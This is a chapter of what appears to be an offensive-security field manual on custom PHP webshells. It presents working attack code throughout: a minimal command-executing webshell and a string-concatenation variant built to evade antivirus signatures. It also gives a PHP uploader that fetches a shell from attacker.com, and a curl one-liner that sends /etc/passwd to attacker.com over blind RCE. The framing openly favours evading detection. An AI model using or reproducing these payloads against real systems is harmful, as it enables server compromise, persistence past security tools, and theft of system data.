# Chapter 6.4: Writing Custom PHP Payloads

---

## Why Custom?

Standard webshells (like c99 or r57) are detected by every antivirus on the planet. If you upload them, they are deleted instantly.

To survive, you must write your own. It does not need to be complex. It just needs to be unique.

## The Minimalist Web Shell

**Code:**
```php
<?php system($_GET['c']); ?>
```

**Obfuscation:**
Antivirus scans for `system(`. So we hide it.

```php
<?php
$a = "sys";
$b = "tem";
$cmd = $a . $b;
$cmd($_GET['c']);
?>
```
Now, the static signature analyzer sees string concatenation, not a system call. But PHP executes it just the same.

## The Uploader

Sometimes you have command injection (RCE) but no file upload form. You can build one.

```php
<?php
file_put_contents("shell.php", fopen("http://attacker.com/shell.txt", 'r'));
?>
```
This script reaches out to effectively *download* your malware from your server and save it locally.

## The Information Leaker

If you only have Blind RCE (you can run commands but see no output), use `curl` to send the data to yourself.

```bash
cat /etc/passwd | curl -d @- http://attacker.com/
```

This sends the content of the password file as a POST request to your listening server.

---

"Simplicity evades detection."
Marliz Intel Field Manual
